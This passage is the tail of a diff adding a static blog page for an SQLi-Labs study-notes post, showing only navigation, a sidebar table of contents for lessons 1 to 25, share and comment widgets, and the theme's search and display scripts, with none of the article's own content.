+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/29/python实现MD5_Base64加密小工具/" rel="next" title="python实现MD5,Base64加密小工具">
+                <i class="fa fa-chevron-left"></i> python实现MD5,Base64加密小工具
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/08/01/SQL-Injection绕过技巧/" rel="prev" title="SQL注入绕过技巧">
+                SQL注入绕过技巧 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="w2n1ck" />
+          <p class="site-author-name" itemprop="name">w2n1ck</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://010.dropsec.xyz/" title="小光头" target="_blank">小光头</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.w2n1ck.com/" title="个人主页" target="_blank">个人主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-1"><span class="nav-number">1.</span> <span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-2"><span class="nav-number">2.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-3"><span class="nav-number">3.</span> <span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-4"><span class="nav-number">4.</span> <span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-5"><span class="nav-number">5.</span> <span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-6"><span class="nav-number">6.</span> <span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-7"><span class="nav-number">7.</span> <span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-8"><span class="nav-number">8.</span> <span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-9"><span class="nav-number">9.</span> <span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-10"><span class="nav-number">10.</span> <span class="nav-text">Less-10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-11"><span class="nav-number">11.</span> <span class="nav-text">Less-11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-12"><span class="nav-number">12.</span> <span class="nav-text">Less-12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-13"><span class="nav-number">13.</span> <span class="nav-text">Less-13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-14"><span class="nav-number">14.</span> <span class="nav-text">Less-14</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-15"><span class="nav-number">15.</span> <span class="nav-text">Less-15</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-16"><span class="nav-number">16.</span> <span class="nav-text">Less-16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-17"><span class="nav-number">17.</span> <span class="nav-text">Less-17</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-18"><span class="nav-number">18.</span> <span class="nav-text">Less-18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-19"><span class="nav-number">19.</span> <span class="nav-text">Less-19</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-20"><span class="nav-number">20.</span> <span class="nav-text">Less-20</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-21"><span class="nav-number">21.</span> <span class="nav-text">Less-21</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-22"><span class="nav-number">22.</span> <span class="nav-text">Less-22</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-23"><span class="nav-number">23.</span> <span class="nav-text">Less-23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-24"><span class="nav-number">24.</span> <span class="nav-text">Less-24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Less-25"><span class="nav-number">25.</span> <span class="nav-text">Less-25</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w2n1ck</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2016/07/29/SQL-Labs学习笔记/';
+          this.page.identifier = '2016/07/29/SQL-Labs学习笔记/';
+          this.page.title = 'SQLi-Labs学习笔记';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="255,0,0" opacity='0.7' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
